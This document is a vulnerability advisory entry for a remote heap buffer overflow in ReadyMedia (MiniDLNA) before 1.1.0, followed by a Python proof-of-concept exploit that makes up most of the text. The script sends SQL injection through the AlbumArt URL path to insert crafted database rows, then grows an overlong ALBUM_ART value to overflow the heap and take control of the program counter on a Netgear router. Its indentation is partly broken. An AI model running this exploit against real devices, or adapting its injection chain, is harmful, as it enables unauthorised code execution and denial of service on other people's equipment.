source: http://www.securityfocus.com/bid/61282/info

ReadyMedia is prone to a remote heap-based buffer-overflow vulnerability.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

ReadyMedia prior to 1.1.0 are vulnerable. 

#!/usr/bin/env python
#AAAAinject.py
# Author: Zachary Cutlip
# zcutlip@tacnetsol.com
# twitter: @zcutlip
#This script injects a buffer overflow into the ALBUM_ART table of
#MiniDLNA's SQLite database. When queried with the proper soap request,
#this buffer overflow demonstrates arbitrary code execution by placing a 
#string of user-controlled 'A's in the CPU's program counter. This
#affects MiniDLNA version 1.0.18 as shipped with Netgear WNDR3700 version 3.
import math
import sys
import urllib,socket,os,httplib
import time
from overflow_data import DlnaOverflowBuilder
headers={"Host":"10.10.10.1"}
host="10.10.10.1"
COUNT=8
LEN=128
empty=''
overflow_strings=[]
overflow_strings.append("AA")
overflow_strings.append("A"*LEN)
overflow_strings.append("B"*LEN)
overflow_strings.append("C"*LEN)
overflow_strings.append("D"*LEN)
overflow_strings.append("A"*LEN)
overflow_strings.append("\x10\x21\x76\x15"*(LEN/4))
overflow_strings.append("\x10\x21\x76\x15"*(LEN/4))
overflow_strings.append("D"*LEN)
overflow_strings.append("D"*LEN)
overflow_strings.append("D"*LEN)
path_beginning='/AlbumArt/1;'
path_ending='-18.jpg'
details_insert_query='insert/**/into/**/DETAILS(ID,SIZE,TITLE,ARTIST,ALBUM'+\
',TRACK,DLNA_PN,MIME,ALBUM_ART,DISC)/**/VALUES("31337"'+\
',"PWNED","PWNED","PWNED","PWNED","PWNED","PWNED"'+\
',"PWNED","1","PWNED");'
objects_insert_query='insert/**/into/**/OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID)'+\
'/**/VALUES("PWNED","PWNED","container","31337");'
details_delete_query='delete/**/from/**/DETAILS/**/where/**/ID="31337";'
objects_delete_query='delete/**/from/**/OBJECTS/**/where/**/OBJECT_ID="PWNED";'
def build_injection_req(query):
 request=path_beginning+query+path_ending
return request
def do_get_request(request):
 conn=httplib.HTTPConnection(host,8200)
 conn.request("GET",request,"",headers)
 conn.close()
def build_update_query(string):
 details_update_query='update/**/DETAILS/**/set/**/ALBUM_ART=ALBUM_ART'+\
'||"'+string+'"/**/where/**/ID="31337";'
return details_update_query
def clear_overflow_data():
print "Deleting existing overflow data..."
 request=build_injection_req(details_delete_query)
 do_get_request(request)
 request=build_injection_req(objects_delete_query)
 do_get_request(request)
 time.sleep(1)

def insert_overflow_data():
print("Setting up initial database records....")
 request=build_injection_req(objects_insert_query)
 do_get_request(request)
 request=build_injection_req(details_insert_query)
 do_get_request(request)
print("Building long ALBUM_ART string.")
for string in overflow_strings:
 req=build_injection_req(build_update_query(string))
 do_get_request(req)
clear_overflow_data()
insert_overflow_data()